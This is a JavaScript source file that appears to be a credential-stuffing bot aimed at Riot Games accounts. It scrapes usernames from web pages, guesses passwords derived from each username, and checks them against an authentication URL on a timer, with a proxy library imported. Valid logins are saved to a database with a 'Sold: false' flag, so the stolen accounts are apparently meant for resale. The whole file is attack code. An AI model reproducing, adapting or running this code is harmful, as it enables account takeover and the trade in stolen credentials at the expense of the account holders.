/* eslint-disable no-await-in-loop */
const { uuid } = require('uuidv4');
const HttpsProxyAgent = require('https-proxy-agent');
const { Cookie, CookieJar } = require('tough-cookie');

const { NODE_ENV, RIOT_AUTH_URL, TEST_INTERVAL } = require('../commons/env');
const { getNNumbers } = require('../commons/numbers');
const { haveSameElements } = require('../commons/arrays');
const rollbar = require('../commons/rollbar');
const { axios } = require('../commons/request');
const proxies = require('../constants/proxies');
const urls = require('../constants/urls');
const { getPasswordSet } = require('../constants/tests');
const { account } = require('../database/models');

const { getUsers } = require('./get_users');
const { areCredentialsOk } = require('./test_user');

const interval = +TEST_INTERVAL;
const requestInterval = 1000;
const minPageNum = 13;
const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: [] }));

const checkAndStore = async (username, password, url) => {
  const validCredentials = await areCredentialsOk(username, password);
  if (!validCredentials) return;
  account.save({
    UserName: username,
    Password: password,
    FromUrl: url,
    Sold: false
  });
};
const requestUsers = async (url, state) => {
  console.log('GET', url);
  // User list request
  const userResp = await axios({ options: { url } });
  if (!userResp) return;
  const users = getUsers(userResp.body);
  if (haveSameElements(users, state.lastUsers)) {
    console.log('Same elements', users, state.lastUsers);
    state.pageNum = minPageNum;
    return;
  }
  for (let i = 0; i < users.length; i += 1) {}
  // console.log('Got Users from', url, users);
  state.lastUsers = users;
  state.pageNum += 1;
  let time = 2;
  for (let i = 0; i < users.length; i += 1) {
    const user = users[i];
    const passwords = getPasswordSet(user);
    // const proxyConfig = await changeProxy();
    for (let ii = 0; ii < passwords.length; ii += 1) {
      setTimeout(checkAndStore, time, user, passwords[ii], url);
      time += requestInterval;
    }
  }
};

const execute = () =>
  setTimeout(async () => {
    const pages = getNNumbers(urls.length - 1);
    for (let i = 0; i < states.length; i += 1) {
      const state = states[i];
      const { pageNum, lastUsers } = states[i];
      const url = `${states[i].url}${states[i].pageNum}`;
      requestUsers(url, state);
    }
    execute();
  }, interval);

// if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
// execute();
